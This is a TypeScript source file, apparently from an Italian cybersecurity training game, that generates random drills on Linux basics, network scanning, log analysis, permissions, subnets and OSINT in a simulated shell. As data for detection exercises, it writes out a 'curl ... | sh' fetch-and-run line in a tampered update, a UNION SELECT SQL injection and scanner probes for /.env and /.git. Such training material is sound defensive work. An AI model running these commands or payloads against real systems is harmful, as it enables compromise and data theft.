// "Simulazioni": sfide generate a caso, sempre diverse, per ripassare i capitoli.
// Ogni generatore crea i suoi file/dati nel deck e restituisce la sfida con la risposta.

import type { Host } from '../engine/network';
import { addDomain } from '../engine/osint';
import { base64Encode, sha256 } from '../engine/sha256';
import type { Shell } from '../engine/shell';
import type { ShellEvent } from '../engine/types';
import type { Markup } from '../game/types';

export type Level = 1 | 2 | 3;

export interface Drill {
  chapter: string;
  title: string;
  /** chi te lo chiede e perché (scelto a caso tra più varianti) */
  story?: Markup;
  prompt: Markup;
  hints: string[];
  /** risposte accettate con "flag" (maiuscole ignorate) */
  answer?: string[];
  /** in alternativa: lo stato del sistema dimostra che il lavoro è fatto */
  state?: (sh: Shell) => boolean;
  /** oppure: un evento della shell lo dimostra */
  check?: (ev: ShellEvent, sh: Shell) => boolean;
  /** comandi che risolvono la sfida (usati dai test e mostrati come soluzione) */
  solve: string[];
}

export interface Rng {
  next(): number;
  int(a: number, b: number): number;
  pick<T>(arr: readonly T[]): T;
  shuffle<T>(arr: readonly T[]): T[];
  hex(n: number): string;
}

export function makeRng(seed: number): Rng {
  let a = seed >>> 0;
  const next = () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  const int = (lo: number, hi: number) => lo + Math.floor(next() * (hi - lo + 1));
  return {
    next,
    int,
    pick: (arr) => arr[Math.floor(next() * arr.length)],
    shuffle: (arr) => {
      const c = [...arr];
      for (let i = c.length - 1; i > 0; i--) {
        const j = Math.floor(next() * (i + 1));
        [c[i], c[j]] = [c[j], c[i]];
      }
      return c;
    },
    hex: (n) => Array.from({ length: n }, () => '0123456789abcdef'[Math.floor(next() * 16)]).join(''),
  };
}

// ---------------------------------------------------------------- dati casuali

const NAMES = ['anna', 'bruno', 'carla', 'dario', 'elena', 'fabio', 'gina', 'hugo', 'irene', 'jacopo', 'kira', 'luca', 'marta', 'nico', 'olga', 'paolo', 'rita', 'sara', 'teo', 'vera'];
const WORDS = ['neon', 'cromo', 'pioggia', 'sintetico', 'circuito', 'ombra', 'vicolo', 'segnale', 'drone', 'impulso', 'riflesso', 'ruggine', 'tempesta', 'vapore'];
const DIRS = ['vecchi', 'progetti', 'foto', 'contratti', 'misc', 'backup', 'note', 'archivio', 'export', 'tmp2'];
const EXTRA = ['log', 'txt', 'cfg', 'bak', 'csv'];

const pubIp = (r: Rng) => `${r.pick(['198.51.100', '203.0.113', '192.0.2'])}.${r.int(2, 250)}`;
const intIp = (r: Rng) => `10.0.${r.int(1, 9)}.${r.int(2, 250)}`;
const pad2 = (n: number) => String(n).padStart(2, '0');
const time = (s: number) => `${pad2(Math.floor(s / 3600) % 24)}:${pad2(Math.floor((s % 3600) / 60))}:${pad2(s % 60)}`;

interface Ctx {
  sh: Shell;
  r: Rng;
  lv: Level;
  /** cartella dedicata alla sfida, relativa alla home (es. "sim/3-archivio") */
  dir: string;
}

const abs = (c: Ctx, rel: string) => `${c.sh.home}/${c.dir}/${rel}`;
const write = (c: Ctx, rel: string, content: string, perms?: string) =>
  c.sh.fs.writeFile(abs(c, rel), content, { owner: c.sh.user, group: c.sh.user, perms });

/** Accetta il percorso completo, quello dalla home e il solo nome del file. */
function pathAnswers(c: Ctx, rel: string): string[] {
  return [`${c.dir}/${rel}`, `${c.sh.home}/${c.dir}/${rel}`, `~/${c.dir}/${rel}`, rel, rel.split('/').pop()!];
}

type Gen = { id: string; dirName: string; make: (c: Ctx) => Omit<Drill, 'chapter'> };

// ---------------------------------------------------------------- capitolo 01: Linux di base

const G01: Gen[] = [
  {
    id: 'flag-nascosta',
    dirName: 'archivio',
    make: (c) => {
      const { r, lv } = c;
      const dirs = r.shuffle(DIRS).slice(0, 2 + lv * 2);
      for (const d of dirs)
        for (let i = 0; i < 1 + lv; i++) write(c, `${d}/${r.pick(WORDS)}_${i}.${r.pick(EXTRA)}`, `${r.pick(WORDS)} ${r.pick(WORDS)}\n`);
      const flag = `NC{${r.hex(10)}}`;
      const target = r.pick(dirs);
      const hidden = lv === 1 ? `${target}/.segreto` : lv === 2 ? `${target}/.cache/nota` : `${target}/.cache/.x/.n`;
      write(c, hidden, `Ben fatto.\n${flag}\n`);
      if (lv === 3) write(c, `${r.pick(dirs)}/LEGGIMI.txt`, 'La flag non è qui. Guarda meglio.\n');
      return {
        title: 'La flag nascosta',
        prompt: `Nella cartella \`${c.dir}\` c'è una flag nascosta nel formato \`NC{...}\`. Trovala e inviala con \`flag\`.`,
        hints: ['Le cose nascoste hanno un nome che inizia con un punto: ls -a', `find ${c.dir} -name ".*"`],
        answer: [flag],
        solve: [`cat ${c.dir}/${hidden}`],
      };
    },
  },
  {
    id: 'conta-file',
    dirName: 'registri',
    make: (c) => {
      const { r, lv } = c;
      const n = r.int(3, 4 + lv * 3);
      const dirs = r.shuffle(DIRS).slice(0, 1 + lv);
      for (let i = 0; i < n; i++) write(c, `${r.pick(dirs)}/${r.pick(WORDS)}_${i}.log`, 'evento\n');
      for (let i = 0; i < lv * 3; i++) write(c, `${r.pick(dirs)}/${r.pick(WORDS)}_${i}.${r.pick(['txt', 'bak', 'cfg'])}`, 'altro\n');
      return {
        title: 'Inventario',
        prompt: `Quanti file con estensione \`.log\` ci sono in \`${c.dir}\`, contando anche le sottocartelle? Invia il numero con \`flag\`.`,
        hints: ['find cerca anche nelle sottocartelle.', `find ${c.dir} -name "*.log" | wc -l`],
        answer: [String(n)],
        solve: [`find ${c.dir} -name "*.log" | wc -l`],
      };
    },
  },
  {
    id: 'crea',
    dirName: 'cantiere',
    make: (c) => {
      const { r, lv } = c;
      const d = `${r.pick(WORDS)}_${r.int(10, 99)}`;
      const f = `${r.pick(WORDS)}.txt`;
      const lines = lv + 1;
      const target = `${c.sh.home}/${c.dir}/${d}/${f}`;
      c.sh.fs.mkdirp(`${c.sh.home}/${c.dir}`, { owner: c.sh.user, group: c.sh.user });
      return {
        title: 'Costruisci',
        prompt: `Crea la cartella \`${c.dir}/${d}\` e dentro il file \`${f}\` con almeno **${lines} righe** di testo.`,
        hints: ['mkdir per la cartella, echo con > e >> per le righe.', `mkdir ${c.dir}/${d} e poi echo "riga" >> ${c.dir}/${d}/${f} (più volte)`],
        solve: [`mkdir ${c.dir}/${d}`, ...Array.from({ length: lines }, (_, i) => `echo "riga ${i + 1}" >> ${c.dir}/${d}/${f}`)],
        state: (sh) => {
          const n = sh.fs.get(target);
          return !!n && n.type === 'file' && n.content.trim().split('\n').filter(Boolean).length >= lines;
        },
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 02: reti

const SERVICES: [number, string][] = [
  [21, 'ftp'],
  [23, 'telnet'],
  [3306, 'mysql'],
  [3389, 'ms-wbt-server (RDP)'],
  [5900, 'vnc'],
];

function addLan(c: Ctx, count: number, special?: [number, string]): { prefix: string; hosts: Host[]; target?: Host } {
  const { r, sh } = c;
  const prefix = `10.99.${r.int(10, 250)}.`;
  sh.net.scopes.push(prefix);
  const used = new Set<number>();
  const hosts: Host[] = [];
  for (let i = 0; i < count; i++) {
    let last = r.int(2, 250);
    while (used.has(last)) last = r.int(2, 250);
    used.add(last);
    const ports = r.shuffle([
      { port: 22, service: 'ssh', version: 'OpenSSH 8.9p1' },
      { port: 80, service: 'http', version: 'nginx 1.24.0' },
      { port: 443, service: 'https', version: 'nginx 1.24.0' },
    ]).slice(0, r.int(1, 3));
    const h: Host = { ip: prefix + last, names: [], mac: '', pingable: r.next() > 0.3, latency: r.int(1, 9), ttl: 64, ports, inScope: true };
    hosts.push(h);
  }
  let target: Host | undefined;
  if (special) {
    target = r.pick(hosts);
    target.ports.push({ port: special[0], service: special[1].split(' ')[0], version: '' });
    target.ports.sort((a, b) => a.port - b.port);
  }
  sh.net.hosts.push(...hosts);
  return { prefix, hosts, target };
}

const G02: Gen[] = [
  {
    id: 'porta',
    dirName: 'rete',
    make: (c) => {
      const svc = c.r.pick(SERVICES);
      const { prefix, target } = addLan(c, 2 + c.lv * 2, svc);
      return {
        title: 'Il servizio esposto',
        prompt: `Sei autorizzato a scansionare la rete \`${prefix}0/24\`. Quale indirizzo IP ha aperta la porta **${svc[0]}** (${svc[1]})? Invialo con \`flag\`.`,
        hints: ['Prima scopri chi è acceso, poi scansiona le porte di ciascuno.', `nmap -sn ${prefix}0/24 e poi nmap su ogni IP trovato`],
        answer: [target!.ip],
        solve: [`nmap -p ${svc[0]} ${target!.ip}`],
      };
    },
  },
  {
    id: 'host-attivi',
    dirName: 'rete',
    make: (c) => {
      const n = 2 + c.lv * 2 + c.r.int(0, 2);
      const { prefix } = addLan(c, n);
      return {
        title: 'Censimento',
        prompt: `Quanti dispositivi sono accesi nella rete autorizzata \`${prefix}0/24\`? Invia il numero con \`flag\`.\n\n?? Attenzione: non tutti rispondono al ping.`,
        hints: ['nmap usa più metodi del semplice ping.', `nmap -sn ${prefix}0/24`],
        answer: [String(n)],
        solve: [`nmap -sn ${prefix}0/24`],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 03: permessi e utenti

const G03: Gen[] = [
  {
    id: 'permessi',
    dirName: 'config',
    make: (c) => {
      const { r, lv } = c;
      const files = r.shuffle(WORDS).slice(0, 3 + lv * 2).map((w) => `${w}.conf`);
      const bad = r.pick(files);
      for (const f of files) write(c, f, f === bad ? `utente=app\npassword=${r.pick(WORDS)}${r.int(100, 999)}!\n` : `opzione=${r.int(1, 9)}\n`, f === bad ? 'rw-rw-rw-' : r.pick(['rw-r--r--', 'rw-------', 'rw-r-----']));
      return {
        title: 'Il file troppo aperto',
        prompt: `In \`${c.dir}\` un file con una password è leggibile **e modificabile da chiunque**. Quale? Invia il nome del file.`,
        hints: ['Guarda la prima colonna di ls -l.', `ls -l ${c.dir}: cerca rw-rw-rw-`],
        answer: [bad],
        solve: [`ls -l ${c.dir} | grep rw-rw-rw-`],
      };
    },
  },
  {
    id: 'chiudi',
    dirName: 'privato',
    make: (c) => {
      const f = `${c.r.pick(WORDS)}_chiavi.txt`;
      write(c, f, 'token=segreto\n', c.r.pick(['rw-r--r--', 'rw-rw-r--', 'rw-rw-rw-']));
      const target = abs(c, f);
      return {
        title: 'Chiudi la serratura',
        prompt: `Il file \`${c.dir}/${f}\` deve essere leggibile e scrivibile **solo dal proprietario**. Correggi i permessi.`,
        hints: ['r=4, w=2, x=1: solo il proprietario con lettura e scrittura.', `chmod 600 ${c.dir}/${f}`],
        solve: [`chmod 600 ${c.dir}/${f}`],
        state: (sh) => sh.fs.get(target)?.perms === 'rw-------',
      };
    },
  },
  {
    id: 'uid',
    dirName: 'utenti',
    make: (c) => {
      const { r, lv } = c;
      const users = r.shuffle(NAMES).slice(0, 3 + lv * 3);
      const lines = ['root:x:0:0:root:/root:/bin/bash'];
      const uids = new Map<string, number>();
      users.forEach((u, i) => {
        const uid = 1000 + i * r.int(1, 7) + r.int(0, 3);
        uids.set(u, uid);
        lines.push(`${u}:x:${uid}:${uid}::/home/${u}:${r.pick(['/bin/bash', '/usr/sbin/nologin'])}`);
      });
      write(c, 'passwd', lines.join('\n') + '\n');
      const who = r.pick(users);
      return {
        title: 'Anagrafe',
        prompt: `Nel file \`${c.dir}/passwd\`, che **UID** ha l'utente \`${who}\`? Invia il numero.`,
        hints: ['È il terzo campo, separato da due punti.', `grep ${who} ${c.dir}/passwd`],
        solve: [`grep ${who}: ${c.dir}/passwd | cut -d ":" -f 3`],
        answer: [String(uids.get(who))],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 04: log e brute force

function authLog(c: Ctx) {
  const { r, lv } = c;
  const attacker = pubIp(r);
  const victim = r.pick(NAMES);
  const lines: string[] = [];
  let t = r.int(0, 20000);
  let pid = r.int(1000, 5000);
  let fails = 0;
  const add = (msg: string) => {
    t += r.int(2, 40);
    lines.push(`Nov 12 ${time(t)} server sshd[${pid++}]: ${msg}`);
  };
  for (let i = 0; i < 3 + lv * 2; i++) add(`Accepted publickey for ${r.pick(NAMES)} from ${intIp(r)} port ${r.int(40000, 60000)} ssh2`);
  for (let i = 0; i < lv * 2; i++) {
    add(`Failed password for ${r.pick(NAMES)} from ${intIp(r)} port ${r.int(40000, 60000)} ssh2`);
    fails++;
  }
  const n = 8 + lv * 6 + r.int(0, 6);
  for (let i = 0; i < n; i++) {
    add(`Failed password for ${r.pick(['root', 'admin', victim])} from ${attacker} port ${r.int(40000, 60000)} ssh2`);
    fails++;
  }
  add(`Accepted password for ${victim} from ${attacker} port ${r.int(40000, 60000)} ssh2`);
  for (let i = 0; i < 2 + lv; i++) add(`Accepted publickey for ${r.pick(NAMES)} from ${intIp(r)} port ${r.int(40000, 60000)} ssh2`);
  write(c, 'auth.log', lines.join('\n') + '\n');
  return { attacker, victim, fails };
}

const G04: Gen[] = [
  {
    id: 'bruteforce',
    dirName: 'caso',
    make: (c) => {
      const { attacker, victim, fails } = authLog(c);
      const variant = c.r.int(0, 2);
      const f = `${c.dir}/auth.log`;
      if (variant === 0)
        return {
          title: 'Chi bussa?',
          prompt: `In \`${f}\` c'è un attacco brute force. Da quale IP? Invialo con \`flag\`.`,
          hints: ['Conta i Failed password per IP (campo 11).', `grep "Failed password" ${f} | cut -d " " -f 11 | sort | uniq -c`],
          answer: [attacker],
          solve: [`grep "Accepted password" ${f} | cut -d " " -f 11`],
        };
      if (variant === 1)
        return {
          title: 'Account violato',
          prompt: `In \`${f}\` un brute force è andato a segno. Quale account è stato compromesso?`,
          hints: ['Cerca un login con password riuscito dallo stesso IP dei tentativi.', `grep "Accepted password" ${f}`],
          answer: [victim],
          solve: [`grep "Accepted password" ${f} | cut -d " " -f 9`],
        };
      return {
        title: 'Quanti tentativi?',
        prompt: `Quanti login **falliti** in totale ci sono in \`${f}\`? Invia il numero.`,
        hints: ['grep e wc -l insieme.', `grep "Failed password" ${f} | wc -l`],
        answer: [String(fails)],
        solve: [`grep "Failed password" ${f} | wc -l`],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 05: testo e script

const G05: Gen[] = [
  {
    id: 'conta-parola',
    dirName: 'dati',
    make: (c) => {
      const { r, lv } = c;
      const word = r.pick(WORDS);
      let count = 0;
      const lines: string[] = [];
      for (let i = 0; i < 10 + lv * 15; i++) {
        const has = r.next() < 0.3;
        const w = has ? (lv === 3 && r.next() < 0.5 ? word.toUpperCase() : word) : r.pick(WORDS.filter((x) => x !== word));
        if (has) count++;
        lines.push(`${r.pick(NAMES)} ${r.pick(WORDS.filter((x) => x !== word))} ${w} ${r.int(1, 99)}`);
      }
      write(c, 'dati.txt', lines.join('\n') + '\n');
      return {
        title: 'Conta le righe',
        prompt: `Quante righe di \`${c.dir}/dati.txt\` contengono la parola \`${word}\`${lv === 3 ? ', **senza distinguere maiuscole e minuscole**' : ''}? Invia il numero.`,
        hints: ['grep può contare da solo.', `grep ${lv === 3 ? '-i ' : ''}-c ${word} ${c.dir}/dati.txt`],
        answer: [String(count)],
        solve: [`grep -i -c ${word} ${c.dir}/dati.txt`],
      };
    },
  },
  {
    id: 'script',
    dirName: 'officina',
    make: (c) => {
      const word = `${c.r.pick(WORDS)}-${c.r.int(100, 999)}`;
      const name = `${c.r.pick(WORDS)}.sh`;
      c.sh.fs.mkdirp(`${c.sh.home}/${c.dir}`, { owner: c.sh.user, group: c.sh.user });
      const target = abs(c, name);
      return {
        title: 'Officina',
        prompt: `Scrivi lo script \`${c.dir}/${name}\` che stampi il testo \`${word}\`, rendilo **eseguibile** e lancialo con \`./\`.`,
        hints: ['nano per scriverlo, chmod +x per renderlo eseguibile.', `nano ${c.dir}/${name} (dentro: echo "${word}"), poi chmod +x e ./${name} dalla sua cartella`],
        solve: [`echo 'echo "${word}"' > ${c.dir}/${name}`, `chmod +x ${c.dir}/${name}`, `./${c.dir}/${name}`],
        check: (ev, sh) => {
          if (ev.type !== 'script' || !ev.ok || ev.path !== target) return false;
          const n = sh.fs.get(target);
          return !!n && n.type === 'file' && n.content.includes(word) && /[xs]/.test(n.perms[2]);
        },
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 06: crittografia

const G06: Gen[] = [
  {
    id: 'base64',
    dirName: 'cripto',
    make: (c) => {
      const flag = `NC{${c.r.hex(12)}}`;
      write(c, 'messaggio.txt', base64Encode(`Messaggio intercettato.\nFlag: ${flag}\n`) + '\n');
      return {
        title: 'Il messaggio travestito',
        prompt: `\`${c.dir}/messaggio.txt\` sembra illeggibile. Leggilo e invia la flag che contiene.`,
        hints: ['Lettere, numeri e un = finale: tipico di una codifica nota.', `base64 -d ${c.dir}/messaggio.txt`],
        answer: [flag],
        solve: [`base64 -d ${c.dir}/messaggio.txt`],
      };
    },
  },
  {
    id: 'integrita',
    dirName: 'aggiornamento',
    make: (c) => {
      const { r, lv } = c;
      const files = r.shuffle(['kernel.img', 'driver.bin', 'update.sh', 'config.ini', 'playlist.cfg', 'boot.cfg', 'catalogo.db']).slice(0, 3 + lv);
      const contents = Object.fromEntries(files.map((f) => [f, `${f} v${r.int(1, 9)}.${r.int(0, 9)} ${r.hex(16)}\n`]));
      const sums = files.map((f) => `${sha256(contents[f])}  ${f}`).join('\n') + '\n';
      const bad = r.pick(files);
      contents[bad] += `curl -s http://${pubIp(r)}/x | sh\n`;
      for (const f of files) write(c, f, contents[f]);
      write(c, 'SHA256SUMS', sums);
      return {
        title: 'Aggiornamento sospetto',
        prompt: `In \`${c.dir}\` c'è un aggiornamento con la lista delle impronte \`SHA256SUMS\`. Quale file è stato manomesso?`,
        hints: ['sha256sum sa confrontare da solo con la lista.', `cd ${c.dir} e poi sha256sum -c SHA256SUMS`],
        answer: [bad],
        solve: [`cd ${c.dir}`, 'sha256sum -c SHA256SUMS | grep FAILED', 'cd'],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 07: log web

const G07: Gen[] = [
  {
    id: 'web-log',
    dirName: 'web',
    make: (c) => {
      const { r, lv } = c;
      const scanner = pubIp(r);
      let sqli = pubIp(r);
      while (sqli === scanner) sqli = pubIp(r);
      const L: string[] = [];
      let t = r.int(0, 3000);
      const add = (ip: string, path: string, st: number) => {
        t += r.int(1, 30);
        L.push(`${ip} - - [12/Nov/2077:${time(72000 + t)} +0100] "GET ${path} HTTP/1.1" ${st} ${r.int(150, 2000)} "-" "Mozilla/5.0"`);
      };
      const normal = () => add(intIp(r), r.pick(['/', '/menu', '/contatti', '/playlist.php?id=' + r.int(1, 9)]), 200);
      for (let i = 0; i < 4 + lv * 4; i++) normal();
      for (const p of r.shuffle(['/admin/', '/.env', '/backup.zip', '/wp-login.php', '/.git/HEAD', '/db.sql', '/phpmyadmin/', '/old/', '/test.php']).slice(0, 4 + lv * 2)) {
        add(scanner, p, 404);
        if (r.next() < 0.4) normal();
      }
      const status = r.pick([500, 200, 403]);
      add(sqli, "/playlist.php?id=1'", status);
      add(sqli, '/playlist.php?id=1%20UNION%20SELECT%20user,pass%20FROM%20utenti--', r.pick([500, 200]));
      for (let i = 0; i < 2 + lv; i++) normal();
      write(c, 'access.log', L.join('\n') + '\n');
      const f = `${c.dir}/access.log`;
      const v = r.int(0, 2);
      if (v === 0)
        return {
          title: 'Lo scanner',
          prompt: `In \`${f}\` uno scanner prova decine di pagine inesistenti. Quale IP?`,
          hints: ['Conta i 404 per IP.', `grep " 404 " ${f} | cut -d " " -f 1 | sort | uniq -c`],
          answer: [scanner],
          solve: [`grep "/.env" ${f} | cut -d " " -f 1`, `grep " 404 " ${f} | cut -d " " -f 1 | sort | uniq -c | sort -n -r | head -n 1`],
        };
      if (v === 1)
        return {
          title: 'SQL injection',
          prompt: `In \`${f}\` c'è un tentativo di SQL injection. Da quale IP?`,
          hints: ['Cerca parole SQL nei parametri.', `grep -i union ${f}`],
          answer: [sqli],
          solve: [`grep -i union ${f} | cut -d " " -f 1`],
        };
      return {
        title: 'La risposta del server',
        prompt: `In \`${f}\`, che **codice di stato** ha restituito il server alla richiesta che termina con un apice \`'\`?`,
        hints: ['Il codice di stato è il campo 9.', `grep "id=1'" ${f}`],
        answer: [String(status)],
        solve: [`grep "id=1'" ${f} | cut -d " " -f 9`],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 08: SIEM

const G08: Gen[] = [
  {
    id: 'spraying',
    dirName: 'siem',
    make: (c) => {
      const { r, lv } = c;
      const sprayer = pubIp(r);
      const victims = r.shuffle(NAMES).slice(0, 6 + lv * 3);
      const winner = r.pick(victims);
      const L: string[] = [];
      let t = 3600;
      const add = (host: string, ev: string, u: string, src: string) => {
        t += r.int(5, 60);
        L.push(`2077-11-12T${time(t)} ${host} ${ev} user=${u} src=${src}`);
      };
      for (let i = 0; i < 3 + lv * 2; i++) add(r.pick(['vpn', 'mail']), 'LOGIN_OK', r.pick(NAMES), intIp(r));
      const clumsy = intIp(r);
      const clumsyUser = r.pick(NAMES);
      for (let i = 0; i < 2 + lv; i++) add('mail', 'LOGIN_FAIL', clumsyUser, clumsy);
      for (const v of victims) add(r.pick(['vpn', 'mail']), 'LOGIN_FAIL', v, sprayer);
      add('vpn', 'LOGIN_OK', winner, sprayer);
      write(c, 'eventi.log', L.join('\n') + '\n');
      const f = `${c.dir}/eventi.log`;
      const v = r.int(0, 2);
      if (v === 0)
        return {
          title: 'Lo spruzzatore',
          prompt: `In \`${f}\` c'è un password spraying. Da quale IP? (solo l'indirizzo)`,
          hints: ['Raggruppa i LOGIN_FAIL per sorgente (campo 5).', `grep LOGIN_FAIL ${f} | cut -d " " -f 5 | sort | uniq -c`],
          answer: [sprayer, `src=${sprayer}`],
          solve: [`grep LOGIN_FAIL ${f} | cut -d " " -f 5 | sort | uniq -c | sort -n -r | head -n 1`],
        };
      if (v === 1)
        return {
          title: 'Quanti bersagli?',
          prompt: `In \`${f}\`, quanti utenti **diversi** ha provato l'IP \`${sprayer}\`?`,
          hints: ['Utenti unici: sort | uniq | wc -l.', `grep ${sprayer} ${f} | grep LOGIN_FAIL | cut -d " " -f 4 | sort | uniq | wc -l`],
          answer: [String(victims.length)],
          solve: [`grep ${sprayer} ${f} | grep LOGIN_FAIL | cut -d " " -f 4 | sort | uniq | wc -l`],
        };
      return {
        title: 'Chi è caduto?',
        prompt: `In \`${f}\` uno spraying ha avuto successo. Quale utente è stato compromesso?`,
        hints: ['Un LOGIN_OK dallo stesso IP dei tanti fallimenti.', `grep ${sprayer} ${f} | grep LOGIN_OK`],
        answer: [winner, `user=${winner}`],
        solve: [`grep ${sprayer} ${f} | grep LOGIN_OK`],
      };
    },
  },
  {
    id: 'beacon',
    dirName: 'dns',
    make: (c) => {
      const { r, lv } = c;
      const ioc = `${r.pick(WORDS)}-${r.pick(['sync', 'cdn', 'update', 'check'])}.top`;
      const pcs = r.shuffle(['pc-reception', 'pc-cassa', 'pc-direzione', 'pc-magazzino', 'pc-laboratorio', 'pc-ufficio']).slice(0, 3 + lv);
      const infected = r.pick(pcs);
      const L: string[] = [];
      for (let i = 0; i < 8 + lv * 6; i++) {
        const beacon = r.next() < 0.3;
        L.push(`2077-11-12T09:${pad2(i % 60)}:00 ${beacon ? infected : r.pick(pcs)} query ${beacon ? ioc : r.pick(['mail.azienda.nc', 'www.nc-news.net', 'update.nightos.net', 'calendar.azienda.nc'])}`);
      }
      L.push(`2077-11-12T10:00:00 ${infected} query ${ioc}`);
      write(c, 'dns.log', L.join('\n') + '\n');
      return {
        title: 'Il battito',
        prompt: `Un bollettino segnala il dominio malevolo \`${ioc}\`. Quale computer lo contatta, secondo \`${c.dir}/dns.log\`?`,
        hints: ['Cerca il dominio nel log.', `grep ${ioc} ${c.dir}/dns.log`],
        answer: [infected],
        solve: [`grep ${ioc} ${c.dir}/dns.log | cut -d " " -f 2 | sort | uniq`],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 09: sottoreti

const toInt = (ip: string) => ip.split('.').reduce((a, o) => a * 256 + Number(o), 0);
const toIp = (n: number) => [24, 16, 8, 0].map((s) => Math.floor(n / 2 ** s) % 256).join('.');

const G09: Gen[] = [
  {
    id: 'subnet',
    dirName: 'calcoli',
    make: (c) => {
      const { r, lv } = c;
      const prefix = lv === 1 ? r.pick([24, 25, 26]) : lv === 2 ? r.int(22, 28) : r.int(19, 29);
      const ip = `${r.pick([10, 172, 192])}.${r.int(0, 255)}.${r.int(0, 255)}.${r.int(1, 254)}`;
      const size = 2 ** (32 - prefix);
      const net = Math.floor(toInt(ip) / size) * size;
      const v = r.int(0, 2);
      const q =
        v === 0
          ? { t: 'quanti host utilizzabili contiene la rete', a: String(size - 2) }
          : v === 1
            ? { t: 'qual è l\'indirizzo di broadcast della rete', a: toIp(net + size - 1) }
            : { t: 'qual è l\'indirizzo di rete', a: toIp(net) };
      return {
        title: 'Calcolo di rete',
        prompt: `Per l'indirizzo \`${ip}/${prefix}\`, ${q.t}? Invia la risposta con \`flag\`.`,
        hints: ['C\'è uno strumento che fa i conti per te.', `ipcalc ${ip}/${prefix}`],
        answer: [q.a],
        solve: [`ipcalc ${ip}/${prefix}`],
      };
    },
  },
  {
    id: 'scope',
    dirName: 'calcoli',
    make: (c) => {
      const { r, lv } = c;
      const prefix = r.int(24 - lv, 28);
      const base = `10.${r.int(0, 255)}.${r.int(0, 255)}.0`;
      const size = 2 ** (32 - prefix);
      const net = Math.floor(toInt(base) / size) * size;
      const inside = r.next() < 0.5;
      const ip = inside ? toIp(net + r.int(1, size - 2)) : toIp(net + size + r.int(1, 40));
      return {
        title: 'Dentro o fuori?',
        prompt: `Il contratto autorizza la rete \`${toIp(net)}/${prefix}\`. L'indirizzo \`${ip}\` è nello scope? Rispondi \`flag si\` o \`flag no\`.`,
        hints: ['Guarda HostMin e HostMax.', `ipcalc ${toIp(net)}/${prefix}`],
        solve: [`ipcalc ${toIp(net)}/${prefix}`],
        answer: [inside ? 'si' : 'no', inside ? 'sì' : 'no'],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 10: OSINT

const G10: Gen[] = [
  {
    id: 'spf',
    dirName: 'osint',
    make: (c) => {
      const { r } = c;
      const domain = `${r.pick(WORDS)}-${r.pick(['bar', 'ottica', 'studio', 'garage', 'clinica'])}${r.int(1, 99)}.nc`;
      const open = r.next() < 0.5;
      addDomain(domain, { A: [pubIp(r)], TXT: [`"v=spf1 include:_spf.nc-mail.nc ${open ? '+all' : r.pick(['-all', '~all'])}"`] });
      return {
        title: 'Posta falsificabile?',
        prompt: `La configurazione SPF di \`${domain}\` permette a **qualsiasi** server di inviare email a suo nome? Rispondi \`flag si\` o \`flag no\`.`,
        hints: ['Guarda i record TXT.', `dig ${domain} TXT: +all = tutti autorizzati`],
        solve: [`dig ${domain} TXT`],
        answer: [open ? 'si' : 'no', open ? 'sì' : 'no'],
      };
    },
  },
  {
    id: 'crtsh',
    dirName: 'osint',
    make: (c) => {
      const { r, lv } = c;
      const domain = `${r.pick(WORDS)}${r.int(1, 99)}.nc`;
      const subs = r.shuffle(['www', 'mail', 'vpn', 'shop', 'api', 'portale', 'cdn', 'intranet']).slice(0, 3 + lv);
      const old = `${r.pick(['dev-old', 'test', 'vecchio', 'beta', 'staging-2073'])}.${domain}`;
      const list = r.shuffle([...subs.map((s) => ({ logged: `2077-${pad2(r.int(1, 10))}-${pad2(r.int(1, 28))}`, name: `${s}.${domain}` })), { logged: `${r.int(2069, 2073)}-${pad2(r.int(1, 12))}-01`, name: old }]);
      addDomain(domain, { A: [pubIp(r)] }, undefined, list);
      return {
        title: 'Il sottodominio dimenticato',
        prompt: `Tra i certificati di \`${domain}\` ce n'è uno molto più vecchio degli altri: un server probabilmente dimenticato. Quale nome?`,
        hints: ['I log di certificate transparency sono pubblici.', `crtsh ${domain}: guarda le date`],
        answer: [old],
        solve: [`crtsh ${domain} | sort | head -n 1`],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 11: privilegi

const G11: Gen[] = [
  {
    id: 'suid',
    dirName: 'sistema',
    make: (c) => {
      const { r, lv } = c;
      const std = ['passwd', 'sudo', 'su', 'mount', 'umount', 'chsh'].slice(0, 2 + lv);
      for (const s of std) write(c, `usr/bin/${s}`, 'ELF', 'rwsr-xr-x');
      for (const s of r.shuffle(['ls', 'cat', 'grep', 'nano', 'bash', 'find']).slice(0, 2 + lv)) write(c, `usr/bin/${s}`, 'ELF', 'rwxr-xr-x');
      const odd = `opt/${r.pick(WORDS)}/${r.pick(['agent', 'helper', 'updater', 'sync'])}`;
      write(c, odd, 'ELF', 'rwsr-xr-x');
      return {
        title: 'Il SUID fuori posto',
        prompt: `In \`${c.dir}\` c'è la copia di un sistema. Quale file **SUID** non è uno standard di Linux? Invia il percorso (va bene anche relativo a \`${c.dir}\`).`,
        hints: ['find ha un filtro per i file SUID.', `find ${c.dir} -perm -4000`],
        answer: pathAnswers(c, odd),
        solve: [`find ${c.dir} -perm -4000 | grep opt`],
      };
    },
  },
  {
    id: 'segreto',
    dirName: 'app',
    make: (c) => {
      const { r, lv } = c;
      const pw = `${r.pick(WORDS)}${r.pick(['!', '#', '$'])}${r.int(10, 99)}`;
      const files = r.shuffle(WORDS).slice(0, 3 + lv * 2);
      const target = r.pick(files);
      for (const f of files) write(c, `${f}/config.ini`, f === target ? `[db]\nuser=app\npassword=${pw}\n` : `[app]\nporta=${r.int(8000, 9000)}\n`);
      return {
        title: 'Password dimenticata',
        prompt: `In una delle configurazioni dentro \`${c.dir}\` c'è una password in chiaro. Qual è?`,
        hints: ['Cerca la parola password nei file .ini.', `for f in $(find ${c.dir} -name "*.ini"); do grep password $f; done`],
        answer: [pw, `password=${pw}`],
        solve: [`for f in $(find ${c.dir} -name "*.ini"); do grep password $f; done`],
      };
    },
  },
];

// ---------------------------------------------------------------- capitolo 12: Windows

